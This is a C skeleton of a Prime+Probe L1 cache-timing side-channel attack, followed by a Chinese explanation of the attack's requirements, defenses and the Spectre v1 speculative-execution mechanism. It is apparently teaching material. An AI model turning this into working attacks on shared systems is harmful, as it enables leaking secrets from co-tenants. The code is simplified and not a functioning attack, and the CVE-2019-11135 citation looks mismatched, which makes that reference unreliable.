#include <stdio.h>
#include <stdint.h>
#include <x86intrin.h>
#include <string.h>
#include <stdlib.h>

#define CACHE_LINE_SIZE 64
#define L1_SET_COUNT 64  // 假设L1数据缓存64组，每组8路
#define EVICTION_SIZE (L1_SET_COUNT * CACHE_LINE_SIZE * 8) // 填满整个缓存

// 测量时间
static inline uint64_t rdtscp() {
    unsigned int aux;
    return __rdtscp(&aux);
}

// 填充一个缓存集：访问一组地址，这些地址映射到同一缓存集
void prime_set(char *base, int set_index) {
    // 每个缓存行64字节，同一缓存集的地址间隔为缓存大小/组数
    int stride = L1_SET_COUNT * CACHE_LINE_SIZE; // 假设直接映射简化
    for (int i = 0; i < 8; i++) { // 8路
        volatile char *addr = base + set_index * CACHE_LINE_SIZE + i * stride;
        (void)*addr;
    }
}

// 探测缓存集：测量访问时间，如果时间短则未被驱逐
uint64_t probe_set(char *base, int set_index) {
    uint64_t start, end;
    start = rdtscp();
    volatile char *addr = base + set_index * CACHE_LINE_SIZE;
    (void)*addr;
    end = rdtscp();
    return end - start;
}

int main() {
    // 分配一块内存，用于填充缓存
    char *eviction_buffer = aligned_alloc(CACHE_LINE_SIZE, EVICTION_SIZE);
    memset(eviction_buffer, 0, EVICTION_SIZE);

    // 假设要监控的缓存集为0
    int target_set = 0;

    // Prime: 填充目标缓存集
    prime_set(eviction_buffer, target_set);

    // 等待受害者执行（实际需同步）
    usleep(100);

    // Probe: 测量目标缓存集的访问时间
    uint64_t time = probe_set(eviction_buffer, target_set);

    // 判断：如果时间大于阈值（如200周期），说明被驱逐，受害者访问了该集
    if (time > 200) {
        printf("受害者访问了缓存集 %d\n", target_set);
    } else {
        printf("未访问\n");
    }

    free(eviction_buffer);
    return 0;
}


实际Prime+Probe攻击需要：1）确定缓存拓扑（组数、路数、行大小）；2）构建驱逐集（确保所有地址映射到同一缓存集）；3）高精度计时（RDTSCP）；4）多次测量统计。防御方法包括：缓存分区（如Intel CAT）、随机缓存映射、禁用超线程、使用恒定时间代码等。Prime+Probe常用于跨虚拟机侧信道攻击（如CVE-2019-11135等）。

Spectre v1（CVE-2017-5753）利用现代CPU的分支预测和乱序执行机制。当条件分支（如数组边界检查）被训练为预测为真时，CPU会推测性地执行分支内的代码，即使实际条件为假。这些推测执行会修改缓存状态，即使最终结果被丢弃，缓存中的痕迹仍可被侧信道攻击检测到。攻击者可以诱导受害者程序在边界检查失败时仍然访问越界内存，从而泄露秘密数据。

原理：1）训练分支预测器，使目标分支多次为真；2）提供越界索引，使分支预测器预测为真，CPU推测执行越界访问；3）越界访问的值被用于计算另一个内存地址的访问（如数组索引），从而将秘密值编码到缓存中；4）通过Flush+Reload或Prime+Probe检测缓存状态，恢复秘密字节。

